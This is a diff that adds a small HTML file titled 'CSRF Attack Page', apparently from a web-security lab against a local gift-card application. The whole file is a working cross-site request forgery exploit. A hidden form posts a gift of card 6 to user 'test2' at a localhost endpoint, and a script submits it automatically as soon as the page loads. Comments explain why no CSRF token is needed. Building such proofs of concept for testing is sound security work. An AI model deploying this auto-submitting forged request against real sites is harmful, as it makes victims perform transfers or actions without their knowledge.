@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>CSRF Attack Page</title>
+</head>
+<body>
+    <form id="csrf-form" action="http://127.0.0.1:8000/gift/6" method="POST">
+        <!-- The hidden field for the CSRF token is not needed if the server does not enforce CSRF protection -->
+        <!-- <input type="hidden" name="csrfmiddlewaretoken" value="YOUR_CSRF_TOKEN" /> -->
+        
+        <!-- Form data for gifting the Tuition Card -->
+        <!-- The recipient_username field should be set to the username of the user receiving the gift -->
+        <input type="hidden" name="recipient_username" value="test2" />
+        <!-- The card_id field should be set to the product number of the card you want to gift -->
+        <input type="hidden" name="card_id" value="6" />
+        
+        <!-- Add any other required hidden fields for the gift action here -->
+
+        <!-- The submit input does not need to be hidden since JavaScript will submit the form -->
+        <input type="submit" value="Gift Card" />
+    </form>
+
+    <script>
+        // Automatically submit the form when the page loads
+        window.onload = function() {
+            // This will trigger the submit event of the form as soon as the page is loaded
+            document.getElementById("csrf-form").submit();
+        };
+    </script>
+</body>
+</html>
